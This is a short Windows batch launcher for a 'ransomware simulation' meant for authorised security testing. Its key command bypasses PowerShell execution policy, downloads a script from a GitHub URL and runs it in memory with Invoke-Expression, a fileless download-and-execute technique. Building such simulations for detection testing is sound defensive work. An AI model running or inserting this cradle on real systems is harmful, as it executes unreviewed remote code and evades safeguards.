@echo off
REM Standalone batch file to execute ransomware simulation from GitHub
REM Usage: run_ransomware_simulation.bat [delay_in_seconds]
REM Example: run_ransomware_simulation.bat 60
REM
REM FOR AUTHORIZED SECURITY TESTING AND DEMONSTRATION ONLY

REM Set default delay or use command line argument
set DELAY=120
if not "%1"=="" set DELAY=%1

REM GitHub raw URL for the PowerShell script
set SCRIPT_URL=https://raw.githubusercontent.com/beauchompers/attack-simulations/main/atomic-scripts/simple-ransomware-simulation/ransomware_simulation.ps1

echo.
echo ========================================
echo Ransomware Simulation Launcher
echo ========================================
echo.
echo WARNING: FOR AUTHORIZED SECURITY TESTING ONLY
echo.
echo Delay between phases: %DELAY% seconds
echo Downloading script from GitHub...
echo.

REM Execute the PowerShell script directly from GitHub
REM Downloads and executes in memory without saving to disk
powershell.exe -ExecutionPolicy Bypass -Command "& {$script = (New-Object Net.WebClient).DownloadString('%SCRIPT_URL%'); Invoke-Expression $script} -DelayBetweenPhases %DELAY%"

echo.
echo ========================================
echo Simulation Complete
echo ========================================
echo.
pause
